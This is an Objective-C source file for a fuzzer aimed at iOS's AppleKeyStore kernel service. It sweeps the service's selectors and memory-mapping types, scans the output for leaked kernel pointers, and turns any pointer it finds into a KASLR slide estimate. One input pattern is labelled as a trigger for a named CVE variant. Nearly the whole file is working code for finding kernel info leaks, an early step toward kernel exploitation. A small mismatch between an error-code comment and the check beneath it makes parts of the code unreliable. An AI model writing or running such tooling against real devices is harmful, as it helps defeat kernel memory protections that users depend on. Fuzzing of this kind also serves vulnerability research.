// AppleKeyStore Selector Fuzzer — kREAD info leak hunter
//
// Systematically probes all reachable AKS selectors with varied input patterns.
// Each selector is tested with:
//   - Empty input (baseline)
//   - Small scalar inputs (common key IDs)
//   - Struct inputs with controlled sizes
//   - Oversized output buffers (to catch OOB reads)
//
// Output is scanned for kernel pointer patterns:
//   0xFFFFFFF0_xxxxxxxx — kernel text/heap pointers on A17 Pro

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import "aks_fuzzer.h"

static aks_log_fn g_log = NULL;

static void alog(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void alog(const char *fmt, ...) {
    if (!g_log) return;
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    g_log(buf);
}

static bool is_kernel_ptr(uint64_t val) {
    if (val < 0xFFFFFFF000000000ULL) return false;
    if (val >= 0xFFFFFFFFF0000000ULL) return false;
    if (val == 0xFFFFFFFFFFFFFFFFULL) return false;
    if (val == 0xFFFFFFFFFFFFFFFEULL) return false;
    if (val == 0xFFFFFFFF00000000ULL) return false;
    if (val == 0xFFFFFFF000000000ULL) return false;
    uint32_t top32 = (uint32_t)(val >> 32);
    if (top32 == 0xFFFFFFFF) return false;
    return true;
}

static void scan_buffer(const uint8_t *buf, size_t len, uint32_t selector,
                        uint8_t method_type, uint8_t input_pattern,
                        uint32_t output_size, aks_fuzzer_result_t *result) {
    if (len < 8) return;
    result->total_bytes_scanned += (uint32_t)len;

    for (size_t off = 0; off + 8 <= len; off += 4) {
        uint64_t val;
        memcpy(&val, buf + off, 8);
        if (is_kernel_ptr(val)) {
            if (result->hit_count < AKS_MAX_HITS) {
                aks_hit_t *h = &result->hits[result->hit_count];
                h->selector = selector;
                h->value = val;
                h->offset = (uint32_t)off;
                h->output_size = output_size;
                h->method_type = method_type;
                h->input_pattern = input_pattern;
                result->hit_count++;
            }
            alog("AKS FUZZ: ★ HIT sel=%u off=%zu val=0x%llx method=%u pattern=%u",
                 selector, off, (unsigned long long)val, method_type, input_pattern);

            if (!result->has_kaslr) {
                uint64_t base = 0xFFFFFFF007004000ULL;
                uint64_t slide = (val - base) & ~0x3FFFULL;
                if (slide > 0 && slide < 0x20000000ULL) {
                    result->kaslr_candidate = slide;
                    result->has_kaslr = true;
                    alog("AKS FUZZ: ★★★ KASLR CANDIDATE slide=0x%llx from ptr=0x%llx",
                         (unsigned long long)slide, (unsigned long long)val);
                }
            }
        }
    }
}

static io_connect_t open_aks(void) {
    CFMutableDictionaryRef matching = IOServiceMatching("AppleKeyStore");
    if (!matching) {
        alog("AKS FUZZ: IOServiceMatching failed");
        return 0;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, matching);
    if (!service) {
        alog("AKS FUZZ: AppleKeyStore service not found");
        return 0;
    }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        alog("AKS FUZZ: IOServiceOpen failed kr=0x%x (%s)", kr, mach_error_string(kr));
        return 0;
    }

    alog("AKS FUZZ: AppleKeyStore opened conn=%u", conn);
    return conn;
}

static void fuzz_scalar(io_connect_t conn, uint32_t sel, aks_fuzzer_result_t *result) {
    // Pattern 0: no input, max output
    {
        uint64_t out[16];
        memset(out, 0, sizeof(out));
        uint32_t outCnt = 16;
        kern_return_t kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outCnt);
        if (kr == KERN_SUCCESS && outCnt > 0) {
            result->selectors_responding++;
            scan_buffer((const uint8_t *)out, outCnt * 8, sel, 0, 0,
                       (uint32_t)(outCnt * 8), result);
            alog("AKS FUZZ: sel=%u scalar(0 in, %u out) OK", sel, outCnt);
        }
    }

    // Pattern 1: single scalar input = 0
    {
        uint64_t in_val = 0;
        uint64_t out[16];
        memset(out, 0, sizeof(out));
        uint32_t outCnt = 16;
        kern_return_t kr = IOConnectCallScalarMethod(conn, sel, &in_val, 1, out, &outCnt);
        if (kr == KERN_SUCCESS && outCnt > 0) {
            scan_buffer((const uint8_t *)out, outCnt * 8, sel, 0, 1,
                       (uint32_t)(outCnt * 8), result);
        }
    }

    // Pattern 2: two scalar inputs = {1, 0}
    {
        uint64_t in_vals[2] = {1, 0};
        uint64_t out[16];
        memset(out, 0, sizeof(out));
        uint32_t outCnt = 16;
        kern_return_t kr = IOConnectCallScalarMethod(conn, sel, in_vals, 2, out, &outCnt);
        if (kr == KERN_SUCCESS && outCnt > 0) {
            scan_buffer((const uint8_t *)out, outCnt * 8, sel, 0, 2,
                       (uint32_t)(outCnt * 8), result);
        }
    }
}

static void fuzz_struct(io_connect_t conn, uint32_t sel, aks_fuzzer_result_t *result) {
    // Pattern 3: empty input, large output buffer
    {
        uint8_t out[8192];
        memset(out, 0xAA, sizeof(out));
        size_t outSz = sizeof(out);
        kern_return_t kr = IOConnectCallStructMethod(conn, sel, NULL, 0, out, &outSz);
        if (kr == KERN_SUCCESS && outSz > 0) {
            result->selectors_responding++;
            scan_buffer(out, outSz, sel, 1, 3, (uint32_t)outSz, result);
            alog("AKS FUZZ: sel=%u struct(0 in, %zu out) OK", sel, outSz);
        }
    }

    // Pattern 4: 16-byte zero input, large output
    {
        uint8_t in_buf[16];
        memset(in_buf, 0, sizeof(in_buf));
        uint8_t out[8192];
        memset(out, 0xAA, sizeof(out));
        size_t outSz = sizeof(out);
        kern_return_t kr = IOConnectCallStructMethod(conn, sel, in_buf, sizeof(in_buf),
                                                      out, &outSz);
        if (kr == KERN_SUCCESS && outSz > 0) {
            scan_buffer(out, outSz, sel, 1, 4, (uint32_t)outSz, result);
        }
    }

    // Pattern 5: 64-byte input with magic header (ACM-like), large output
    {
        uint8_t in_buf[64];
        memset(in_buf, 0, sizeof(in_buf));
        // ACM message-like header: version + type + length
        uint32_t *hdr = (uint32_t *)in_buf;
        hdr[0] = 1;      // version
        hdr[1] = 0;      // type
        hdr[2] = 0x40;   // length = 64
        hdr[3] = 0;      // reserved

        uint8_t out[8192];
        memset(out, 0xAA, sizeof(out));
        size_t outSz = sizeof(out);
        kern_return_t kr = IOConnectCallStructMethod(conn, sel, in_buf, sizeof(in_buf),
                                                      out, &outSz);
        if (kr == KERN_SUCCESS && outSz > 0) {
            scan_buffer(out, outSz, sel, 1, 5, (uint32_t)outSz, result);
        }
    }

    // Pattern 6: oversized declared_length in SEP control message format
    // This is the CVE-2026-65343 variant check
    {
        uint8_t in_buf[128];
        memset(in_buf, 0, sizeof(in_buf));
        uint32_t *fields = (uint32_t *)in_buf;
        fields[0] = 1;       // version
        fields[1] = 0;       // msg_type
        fields[2] = 0x800;   // declared_length — the CVE-2026-65343 trigger value
        fields[3] = 0;       // padding

        uint8_t out[8192];
        memset(out, 0xAA, sizeof(out));
        size_t outSz = sizeof(out);
        kern_return_t kr = IOConnectCallStructMethod(conn, sel, in_buf, sizeof(in_buf),
                                                      out, &outSz);
        if (kr == KERN_SUCCESS && outSz > 0) {
            scan_buffer(out, outSz, sel, 1, 6, (uint32_t)outSz, result);
            alog("AKS FUZZ: sel=%u SEP-variant(128 in, %zu out) OK — checking for OOB",
                 sel, outSz);
        }
    }
}

static void fuzz_mixed(io_connect_t conn, uint32_t sel, aks_fuzzer_result_t *result) {
    // Pattern 7: scalar in + struct out (IOConnectCallMethod with both)
    {
        uint64_t scalar_in[2] = {0, 0};
        uint8_t struct_out[8192];
        memset(struct_out, 0xAA, sizeof(struct_out));
        size_t struct_out_sz = sizeof(struct_out);

        kern_return_t kr = IOConnectCallMethod(conn, sel,
                                                scalar_in, 2,
                                                NULL, 0,
                                                NULL, NULL,
                                                struct_out, &struct_out_sz);
        if (kr == KERN_SUCCESS && struct_out_sz > 0) {
            result->selectors_responding++;
            scan_buffer(struct_out, struct_out_sz, sel, 2, 7,
                       (uint32_t)struct_out_sz, result);
            alog("AKS FUZZ: sel=%u mixed(2 scalar, %zu struct out) OK", sel, struct_out_sz);
        }
    }

    // Pattern 8: struct in + scalar out
    {
        uint8_t struct_in[64];
        memset(struct_in, 0, sizeof(struct_in));
        uint64_t scalar_out[16];
        memset(scalar_out, 0, sizeof(scalar_out));
        uint32_t scalar_out_cnt = 16;

        kern_return_t kr = IOConnectCallMethod(conn, sel,
                                                NULL, 0,
                                                struct_in, sizeof(struct_in),
                                                scalar_out, &scalar_out_cnt,
                                                NULL, NULL);
        if (kr == KERN_SUCCESS && scalar_out_cnt > 0) {
            scan_buffer((const uint8_t *)scalar_out, scalar_out_cnt * 8, sel, 2, 8,
                       (uint32_t)(scalar_out_cnt * 8), result);
        }
    }
}

static void fuzz_map_memory(io_connect_t conn, aks_fuzzer_result_t *result) {
    // Probe IOConnectMapMemory64 for each type 0..7
    for (uint32_t memType = 0; memType < 8; memType++) {
        mach_vm_address_t addr = 0;
        mach_vm_size_t size = 0;
        kern_return_t kr = IOConnectMapMemory64(conn, memType, mach_task_self(),
                                                 &addr, &size,
                                                 kIOMapAnywhere | kIOMapReadOnly);
        if (kr == KERN_SUCCESS && addr != 0 && size > 0) {
            alog("AKS FUZZ: ★ MapMemory type=%u addr=0x%llx size=0x%llx",
                 memType, (unsigned long long)addr, (unsigned long long)size);

            size_t scanLen = (size > 65536) ? 65536 : (size_t)size;
            scan_buffer((const uint8_t *)(uintptr_t)addr, scanLen, 1000 + memType,
                       1, 9, (uint32_t)scanLen, result);

            IOConnectUnmapMemory64(conn, memType, mach_task_self(), addr);
        }
    }
}

void aks_fuzzer_set_log(aks_log_fn fn) {
    g_log = fn;
}

void aks_fuzzer_run(aks_fuzzer_result_t *result) {
    memset(result, 0, sizeof(*result));

    alog("AKS FUZZ: === AppleKeyStore Selector Fuzzer ===");
    alog("AKS FUZZ: target: CVE-2026-65343 variants + uninitialized output + OOB reads");

    io_connect_t conn = open_aks();
    if (!conn) {
        alog("AKS FUZZ: FAILED to open AppleKeyStore — sandbox may block");
        result->aks_opened = false;
        return;
    }
    result->aks_opened = true;

    // Phase 1: probe selector reachability (0..127)
    alog("AKS FUZZ: phase 1 — selector reachability scan");
    uint32_t reachable = 0;
    for (uint32_t sel = 0; sel < AKS_MAX_SELECTORS; sel++) {
        uint64_t out[1] = {0};
        uint32_t outCnt = 0;
        kern_return_t kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outCnt);
        // e00002c2 = kIOReturnBadArgument (selector exists but bad args)
        // e00002bc = kIOReturnUnsupported (selector not implemented)
        // e00002d8 = kIOReturnNotPermitted
        // 0 = success
        if (kr != 0xe00002bc && kr != 0xe00002c7) {
            reachable++;
            if (sel < 80) {
                alog("AKS FUZZ: sel=%u reachable (kr=0x%x)", sel, kr);
            }
        }
    }
    result->selectors_reachable = reachable;
    alog("AKS FUZZ: %u selectors reachable out of %u probed", reachable, AKS_MAX_SELECTORS);

    // Phase 2: deep fuzz each reachable selector
    alog("AKS FUZZ: phase 2 — deep fuzzing %u selectors", reachable);
    for (uint32_t sel = 0; sel < AKS_MAX_SELECTORS; sel++) {
        uint64_t probe_out[1] = {0};
        uint32_t probe_cnt = 0;
        kern_return_t kr = IOConnectCallScalarMethod(conn, sel, NULL, 0,
                                                      probe_out, &probe_cnt);
        if (kr == 0xe00002bc || kr == 0xe00002c7) continue;

        fuzz_scalar(conn, sel, result);
        fuzz_struct(conn, sel, result);
        fuzz_mixed(conn, sel, result);
    }

    // Phase 3: memory mapping probe
    alog("AKS FUZZ: phase 3 — IOConnectMapMemory64 probe");
    fuzz_map_memory(conn, result);

    // Summary
    alog("AKS FUZZ: === RESULTS ===");
    alog("AKS FUZZ: selectors_reachable=%u responding=%u",
         result->selectors_reachable, result->selectors_responding);
    alog("AKS FUZZ: bytes_scanned=%u hits=%u",
         result->total_bytes_scanned, result->hit_count);
    if (result->has_kaslr) {
        alog("AKS FUZZ: ★★★ KASLR SLIDE FOUND: 0x%llx ★★★",
             (unsigned long long)result->kaslr_candidate);
    }
    for (uint32_t i = 0; i < result->hit_count && i < 16; i++) {
        aks_hit_t *h = &result->hits[i];
        alog("AKS FUZZ: hit[%u] sel=%u off=0x%x val=0x%llx method=%u pattern=%u",
             i, h->selector, h->offset, (unsigned long long)h->value,
             h->method_type, h->input_pattern);
    }

    IOServiceClose(conn);
    alog("AKS FUZZ: done");
}
